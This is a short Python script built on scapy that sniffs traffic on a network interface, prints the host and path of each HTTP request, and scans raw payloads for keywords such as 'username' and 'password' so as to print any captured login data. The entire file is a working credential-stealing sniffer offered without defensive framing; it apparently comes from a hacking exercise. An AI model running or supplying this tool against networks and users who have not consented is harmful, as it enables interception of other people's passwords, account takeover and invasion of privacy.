import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=  process_sniffed_packet)
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("http url is " + str(url))
        credentials = get_cerdentials(packet)
        if credentials:
            print("cerdentials found: " + str(credentials))

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')
def get_cerdentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ["username", "user", "login", "password", "pass","signup","signin"]
        for keyword in keywords:
            if keyword in load:
                return load
myinterface = scapy.conf.ifaces.dev_from_index(18) #checked the line before
sniff(myinterface)